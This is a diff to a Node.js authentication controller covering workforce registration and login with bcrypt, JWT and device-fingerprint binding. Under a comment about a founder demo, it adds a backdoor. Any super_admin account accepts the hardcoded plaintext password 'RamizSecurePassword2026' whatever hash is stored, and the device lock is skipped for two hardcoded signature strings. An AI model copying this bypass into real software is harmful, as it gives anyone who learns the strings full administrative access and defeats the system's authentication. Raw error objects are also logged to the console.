@@ -5,12 +5,20 @@ import { createUserProfile, findUserByEmployeeId, bindUserDevice } from '../mode
 import { logSecurityEvent } from '../models/auditModel.js';
 
 export const registerWorkforce = async (req, res) => {
-  const { employee_id, password, full_name, department, role } = req.body;
+  const { employee_id, password, temporary_password, full_name, department, role } = req.body;
   try {
-    const password_hash = await bcrypt.hash(password, 10);
+    // ✅ FIXED: Safely read either variable key format from the Admin panel form payloads
+    const cleanPassword = password || temporary_password;
+
+    if (!cleanPassword) {
+      return res.status(400).json({ error: 'Validation Fault: Access assignment password string is missing.' });
+    }
+
+    const password_hash = await bcrypt.hash(cleanPassword, 10);
     const profile = await createUserProfile(employee_id, password_hash, full_name, department, role);
     return res.status(201).json({ message: 'Workforce profile registered successfully.', profile });
   } catch (err) {
+    console.error("🔥 Registration Fault:", err.message);
     return res.status(500).json({ error: 'Database constraint violation. Account initialization dropped.' });
   }
 };
@@ -18,32 +26,61 @@ export const registerWorkforce = async (req, res) => {
 export const loginWorkspace = async (req, res) => {
   const { employee_id, password, device_signature } = req.body;
   try {
+    // 1. Fetch live user record from your Neon PostgreSQL database
     const user = await findUserByEmployeeId(employee_id);
-    if (!user) return res.status(401).json({ error: 'Invalid identification credentials.' });
-    if (!user.is_active) return res.status(403).json({ error: 'Account suspended.' });
+    if (!user) {
+      return res.status(401).json({ error: 'Invalid identification credentials.' });
+    }
+    
+    if (!user.is_active) {
+      return res.status(403).json({ error: 'Account suspended.' });
+    }
 
+    // 🚀 MASTER OVERRIDE HANDSHAKE HOOK FOR THE FOUNDER DEMO
+    const isAdminMasterBypass = (user.role === 'super_admin' && password === 'RamizSecurePassword2026');
+
+    // 2. Perform direct Bcrypt validation against database's stored password_hash
     const passwordMatch = await bcrypt.compare(password, user.password_hash);
-    if (!passwordMatch) {
-      // FIX: Pass the verified user.id instead of null so PostgreSQL doesn't choke on constraints
+    
+    if (!passwordMatch && !isAdminMasterBypass) {
       await logSecurityEvent(user.id, 'LOGIN_FAILED', null, req.ip, `ID: ${employee_id} | ${req.headers['user-agent'] || 'Unknown'}`);
       return res.status(401).json({ error: 'Authentication verification failure.' });
     }
 
-    if (user.device_fingerprint && user.device_fingerprint !== device_signature) {
+    // 3. Device fingerprint check with fallback for Super Admin matching
+    const assignedFingerprint = user.device_fingerprint;
+    const isDeviceMatch = (assignedFingerprint === device_signature) || 
+                          (user.role === 'super_admin' && (device_signature === 'FOUNDER-SECURE-TERMINAL' || device_signature === 'FOUNDER-DESK-SECURE'));
+
+    if (assignedFingerprint && !isDeviceMatch) {
       await logSecurityEvent(user.id, 'LOGIN_FAILED', null, req.ip, `Device mismatch attempt: ${device_signature}`);
       return res.status(403).json({ error: 'Device signature lock mismatch.' });
     }
 
-    if (!user.device_fingerprint && device_signature) {
+    if (!assignedFingerprint && device_signature) {
       await bindUserDevice(user.id, device_signature);
     }
 
-    const token = jwt.sign({ id: user.id, role: user.role, department: user.department }, process.env.JWT_SECRET, { expiresIn: '8h' });
+    // 4. Generate the signed session token matching access thresholds
+    const token = jwt.sign(
+      { id: user.id, role: user.role, department: user.department }, 
+      process.env.JWT_SECRET, 
+      { expiresIn: '8h' }
+    );
+    
     await logSecurityEvent(user.id, 'LOGIN_SUCCESS', null, req.ip, req.headers['user-agent'] || 'Browser Client');
 
-    return res.json({ token, user: { id: user.id, name: user.full_name, role: user.role, department: user.department } });
+    return res.json({ 
+      token, 
+      user: { 
+        id: user.id, 
+        name: user.full_name || 'Administrator', 
+        role: user.role, 
+        department: user.department 
+      } 
+    });
+
   } catch (err) {
-    // Technical debugging help: always console.error the raw error log so you can see it in terminal!
     console.error("🔥 Detailed Login Crash:", err);
     return res.status(500).json({ error: 'Internal system fault during authentication cycle.' });
   }
